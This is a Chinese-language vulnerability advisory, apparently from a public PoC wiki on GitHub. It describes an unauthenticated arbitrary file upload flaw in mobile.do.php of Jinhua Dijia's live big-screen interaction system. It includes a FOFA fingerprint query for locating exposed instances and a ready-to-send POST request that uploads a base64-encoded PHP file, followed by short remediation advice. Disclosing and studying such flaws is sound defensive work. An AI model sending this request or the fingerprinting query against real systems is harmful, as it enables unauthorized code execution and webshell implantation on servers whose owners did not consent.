---
fofa: "body="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 金华迪加 现场大屏互动系统 mobile.do.php 任意文件上传漏洞

# 漏洞描述

金华迪加 现场大屏互动系统 mobile.do.php 存在任意文件上传漏洞，未经身份验证远程攻击者可利用该漏洞代码执行，写入WebShell,进一步控制服务器权限。

# 影响版本

现场大屏互动系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"

POC/EXP：

POST /mobile/mobile.do.php?action=msg_uploadimg HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close

filetype=php&imgbase64=PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=

![image-20241101211512032](./.resource/金华迪加现场大屏互动系统mobile.do.php任意文件上传漏洞/media/image-20241101211512032.png)


![image-20241101211543542](./.resource/金华迪加现场大屏互动系统mobile.do.php任意文件上传漏洞/media/image-20241101211543542.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
